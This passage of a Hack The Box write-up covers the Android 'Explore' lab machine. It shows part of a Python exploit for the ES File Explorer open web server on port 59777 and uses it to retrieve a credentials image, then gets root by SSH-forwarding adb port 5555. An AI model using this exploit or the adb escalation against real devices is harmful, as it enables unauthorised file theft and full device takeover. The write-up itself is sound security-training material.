	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span> 
		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Include file name to download."</span><span class="p">)</span> 
		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> 
	<span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s">'/'</span><span class="p">:</span> 
		<span class="k">print</span><span class="p">(</span><span class="s">"[-] You need to provide full path of the file."</span><span class="p">)</span> 
		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="k">else</span> <span class="p">:</span>
		<span class="n">path</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> 
		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Downloading file..."</span><span class="p">)</span> 
		<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">path</span><span class="p">)</span> 
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'out.dat'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">wf</span><span class="p">:</span> 
			<span class="n">wf</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">content</span><span class="p">)</span> 
		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Done. Saved as `out.dat`."</span><span class="p">)</span> 

<span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="n">cmds</span><span class="p">[</span><span class="mi">10</span><span class="p">]:</span> 
	<span class="n">response</span> <span class="o">=</span> <span class="n">httpPost</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> 
	<span class="n">keys</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">keys</span><span class="p">())</span> 
	<span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">keys</span><span class="p">:</span> 
		<span class="k">print</span><span class="p">(</span><span class="n">f</span> <span class="s">"{key} : {response[key]}"</span><span class="p">)</span>
</pre></table></code></div></div><p>We can see how this vulnerability exploits a web server that <code class="language-plaintext highlighter-rouge">ES File Explorer</code> creates on port 59777 when started. If we examine the code further, we can see the following help panel that indicates the available commands for the exploit:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/enum4.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Exploit help panel</em></p><p>First, we will start enumerating potential files that the target machine contains. We will start with the pictures:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/enum5.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>List pictures</em></p><p>We can see a file that is called <code class="language-plaintext highlighter-rouge">creds.jpg</code> that will attract our attention. We will try to download this image in order to inspect it. With the <code class="language-plaintext highlighter-rouge">getFile</code> command of the exploit, we can indicate the path of the file that we want to download:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 900 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/enum6.png" alt="Desktop View" width="900" height="400" data-proofer-ignore> <em>Download file</em></p><p>We can see how the script downloads the file with the name <code class="language-plaintext highlighter-rouge">out.dat</code>, so we will change it to the original <code class="language-plaintext highlighter-rouge">creds.jpg</code> name and we will visualize the picture:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/enum7.png" alt="Desktop View" width="400" height="400" data-proofer-ignore> <em>Credentials</em></p><p>We can see the following credentials in the image:</p><div file="credentials/sshCreds" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/sshCreds"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kristi:Kr1sT!5h@Rp3xPl0r3!
</pre></table></code></div></div><h2 id="user-shell"><span class="mr-2">User Shell</span><a href="#user-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="ssh"><span class="mr-2">SSH</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we remember the enumeration phase, we had the 2222 port open and an SSH server was running on it. We will try to connect with the credentials that we have just discovered:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/user1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>ssh</em></p><p>We can see how we got a shell as the <code class="language-plaintext highlighter-rouge">u0_a76</code> user, so we will proceed and see the <code class="language-plaintext highlighter-rouge">user.txt</code> flag in the <code class="language-plaintext filepath highlighter-rouge">/sdcard</code> directory.</p><h2 id="root-shell"><span class="mr-2">Root Shell</span><a href="#root-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="enumeration-1"><span class="mr-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>At this point, having a shell as the <code class="language-plaintext highlighter-rouge">u0_a76</code> user, we will try to escalate privileges and convert to the <code class="language-plaintext highlighter-rouge">root</code> user. To do this, we will start by listing all the network connections that are running on the target machine:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>netstat <span class="nt">-a</span>
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/root1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>netstat</em></p><p>We can see how the majority of the ports are exposed and are the same ports that we have seen in the enumeration phase, but there is one port that we have not seen. This port is the 5555 port.</p><p>If we research a little bit more about this port, we will notice that in Android, this port usually runs <code class="language-plaintext highlighter-rouge">adb over WiFi</code>. This comes in very handy as <code class="language-plaintext highlighter-rouge">adb</code> allows us to convert to the root user.</p><p>The only problem is that this port is not exposed and we can not access it from the outside. Since we have access to the SSH server, we can use the <code class="language-plaintext highlighter-rouge">-L</code> flag to forward this port to our machine. To do this, we will use the following command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh <span class="nt">-L</span> 5555:127.0.0.1:5555 kristi@10.10.10.247 <span class="nt">-p</span> 2222
</pre></table></code></div></div><p>Once we have the port forwarded, we can check on our machine if any service is running on port 5555:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/root2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>lsof</em></p><p>We can see how port 5555 is being used by SSH (as expected). This means that the port 5555 of our machine corresponds to the 5555 port on the target machine, so we will have a connection with it.</p><h3 id="adb"><span class="mr-2">ADB</span><a href="#adb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>At this point, we will try to connect via <code class="language-plaintext highlighter-rouge">adb</code> to the target machine. To do this, we will connect to the 5555 port on our machine (remember that this port corresponds to the 5555 port on the target machine), initialize <code class="language-plaintext highlighter-rouge">adb</code> as the <code class="language-plaintext highlighter-rouge">root</code> user, and list the connected devices:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/root3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>adb</em></p><p>We can see how we are connected to the target machine via <code class="language-plaintext highlighter-rouge">adb</code> as the <code class="language-plaintext highlighter-rouge">root</code> user.</p><p>To have full control of the target machine, we will spawn an interactive shell. To do this:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/root4.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>root Shell</em></p><p>We can see how we have a shell as the <code class="language-plaintext highlighter-rouge">root</code> user, so we will proceed to visualize the <code class="language-plaintext highlighter-rouge">root.txt</code> flag in the <code class="language-plaintext filepath highlighter-rouge">/data</code> directory.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/android/'>Android</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/android/" class="post-tag no-text-decoration" >android</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >cve</a> <a href="/tags/adb/" class="post-tag no-text-decoration" >adb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Explore+Write-up+-+root%40g2jz%3A~%23&url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fexplore%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Explore+Write-up+-+root%40g2jz%3A~%23&u=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fexplore%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fexplore%2F&text=Explore+Write-up+-+root%40g2jz%3A~%23" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fexplore%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/whoami/">whoami</a><li><a href="/posts/love/">Love Write-up</a><li><a href="/posts/explore/">Explore Write-up</a><li><a href="/posts/knife/">Knife Write-up</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/bountyhunter/"><div class="card-body"> <em class="small" data-ts="1664262000" data-df="ll" > Sep 27, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter Write-up</h3><div class="text-muted small"><p> Enumeration Nmap First, we will start enumerating the open ports on the victim machine. To do that, we will use nmap. We will specify that we want to scan all the port range, that we only want t...</p></div></div></a></div><div class="card"> <a href="/posts/love/"><div class="card-body"> <em class="small" data-ts="1664348400" data-df="ll" > Sep 28, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Love Write-up</h3><div class="text-muted small"><p> Enumeration Nmap As always, we will start by enumerating the ports on the target machine. To do this, we will use our beloved nmap. The scan that we will be using scans all the port range, displ...</p></div></div></a></div><div class="card"> <a href="/posts/knife/"><div class="card-body"> <em class="small" data-ts="1664521200" data-df="ll" > Sep 30, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Knife Write-up</h3><div class="text-muted small"><p> Enumeration Nmap First, we will start scanning the target machine. To do this, we will use nmap. The scan will filter the open ports in all the port range and will use the TCP Syn Port Scan. Opt...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/love/" class="btn btn-outline-primary" prompt="Older"><p>Love Write-up</p></a> <a href="/posts/knife/" class="btn btn-outline-primary" prompt="Newer"><p>Knife Write-up</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://g2jz.github.io/posts/explore/'; this.page.identifier = '/posts/explore/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://https://g2jz-github-io.disqus.com/.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/g2jzz">Gaizka Mart√≠n Mendiola</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B9ZXXC99N4"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-B9ZXXC99N4'); }); </script>
